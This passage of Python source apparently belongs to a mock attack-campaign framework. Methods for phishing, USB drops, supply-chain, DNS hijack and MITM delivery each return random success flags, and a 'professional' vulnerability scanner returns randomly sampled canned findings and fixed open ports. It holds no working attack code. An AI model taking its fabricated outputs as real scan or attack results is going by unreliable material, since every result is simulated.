        success = random.random() > 0.6
        return {
            "success": success,
            "message": "Web upload injection " + ("successful" if success else "failed"),
            "details": {"upload_method": "form_bypass", "file_extension_bypass": success}
        }

    def _inject_email_attachment(self, payload_path, target):
        """Email attachment injection simulation"""
        time.sleep(random.uniform(0.5, 1.5))
        success = random.random() > 0.7
        return {
            "success": success,
            "message": "Email attachment injection " + ("delivered" if success else "blocked"),
            "details": {"email_filter_bypass": success, "attachment_type": "macro_enabled"}
        }

    def _inject_usb_drop(self, payload_path, target):
        """USB drop attack simulation"""
        time.sleep(random.uniform(0.5, 1))
        success = random.random() > 0.4
        return {
            "success": success,
            "message": "USB drop attack " + ("successful" if success else "failed"),
            "details": {"autorun_enabled": success, "user_interaction": not success}
        }

    def _inject_social_engineering(self, payload_path, target):
        """Social engineering attack simulation"""
        time.sleep(random.uniform(1, 2))
        success = random.random() > 0.5
        return {
            "success": success,
            "message": "Social engineering attack " + ("successful" if success else "failed"),
            "details": {"target_compliance": success, "pretext": "IT_support"}
        }

    def _inject_supply_chain(self, payload_path, target):
        """Supply chain attack simulation"""
        time.sleep(random.uniform(2, 3))
        success = random.random() > 0.8
        return {
            "success": success,
            "message": "Supply chain injection " + ("successful" if success else "failed"),
            "details": {"compromise_method": "dependency_poisoning", "persistence_level": "high"}
        }

    def _inject_watering_hole(self, payload_path, target):
        """Watering hole attack simulation"""
        time.sleep(random.uniform(1, 2))
        success = random.random() > 0.6
        return {
            "success": success,
            "message": "Watering hole attack " + ("successful" if success else "failed"),
            "details": {"website_compromised": success, "target_visited": success}
        }

    def _inject_dns_hijack(self, payload_path, target):
        """DNS hijacking attack simulation"""
        time.sleep(random.uniform(1, 2))
        success = random.random() > 0.7
        return {
            "success": success,
            "message": "DNS hijacking " + ("successful" if success else "failed"),
            "details": {"dns_server_compromised": success, "redirection_active": success}
        }

    def _inject_mitm(self, payload_path, target):
        """Man-in-the-middle attack simulation"""
        time.sleep(random.uniform(1, 2))
        success = random.random() > 0.5
        return {
            "success": success,
            "message": "MITM attack " + ("successful" if success else "failed"),
            "details": {"traffic_intercepted": success, "ssl_bypass": success}
        }

    def _inject_phishing(self, payload_path, target):
        """Phishing attack simulation"""
        time.sleep(random.uniform(1, 2))
        success = random.random() > 0.4
        return {
            "success": success,
            "message": "Phishing attack " + ("successful" if success else "failed"),
            "details": {"email_opened": True, "link_clicked": success, "credentials_entered": success}
        }

    def get_injection_statistics(self):
        """Get injection campaign statistics"""
        total_attempts = len(self.injection_attempts)
        successful_attempts = len(self.successful_injections)
        
        if total_attempts == 0:
            return {"total_attempts": 0, "success_rate": 0, "statistics": "No injections attempted"}
        
        success_rate = successful_attempts / total_attempts
        
        # Method statistics
        method_stats = {}
        for attempt in self.injection_attempts:
            method = attempt["method"]
            if method not in method_stats:
                method_stats[method] = {"total": 0, "successful": 0}
            method_stats[method]["total"] += 1
            if attempt["success"]:
                method_stats[method]["successful"] += 1
        
        # Calculate success rates per method
        for method in method_stats:
            total = method_stats[method]["total"]
            successful = method_stats[method]["successful"]
            method_stats[method]["success_rate"] = successful / total if total > 0 else 0
        
        return {
            "total_attempts": total_attempts,
            "successful_attempts": successful_attempts,
            "overall_success_rate": success_rate,
            "method_statistics": method_stats,
            "most_successful_method": max(method_stats.keys(), 
                                        key=lambda k: method_stats[k]["success_rate"]) if method_stats else None
        }

class VulnerabilityScanner:
    """Professional vulnerability scanning system"""
    
    def __init__(self):
        self.logger = Logger()
        self.common_vulns = [
            {
                "name": "Weak SSH Configuration",
                "severity": "Medium",
                "description": "SSH allows weak authentication methods"
            },
            {
                "name": "Unpatched System",
                "severity": "High", 
                "description": "System missing critical security updates"
            },
            {
                "name": "Open Administrative Ports",
                "severity": "High",
                "description": "Administrative services exposed to network"
            },
            {
                "name": "Default Credentials",
                "severity": "Critical",
                "description": "Default usernames and passwords detected"
            }
        ]
    
    def scan_vulnerabilities(self, target, threads=10, timeout=30):
        """Perform vulnerability scan on target"""
        try:
            self.logger.info(f"Scanning vulnerabilities on {target}")
            
            # Simulate vulnerability scanning
            time.sleep(3)
            
            # Return some simulated findings
            findings = random.sample(self.common_vulns, random.randint(1, 3))
            
            self.logger.info(f"Found {len(findings)} vulnerabilities on {target}")
            return findings
            
        except Exception as e:
            self.logger.error(f"Vulnerability scan failed: {str(e)}")
            return []
    
    def scan_ports(self, target, timeout=5):
        """Perform port scan on target"""
        try:
            self.logger.info(f"Scanning ports on {target}")
            
            # Simulate port scanning
            time.sleep(2)
            
            # Return simulated open ports
            open_ports = [
                {"host": target, "port": 22, "service": "SSH", "status": "open"},
                {"host": target, "port": 80, "service": "HTTP", "status": "open"},
                {"host": target, "port": 443, "service": "HTTPS", "status": "open"}
            ]
            
            return open_ports
            
        except Exception as e:
            self.logger.error(f"Port scan failed: {str(e)}")
            return []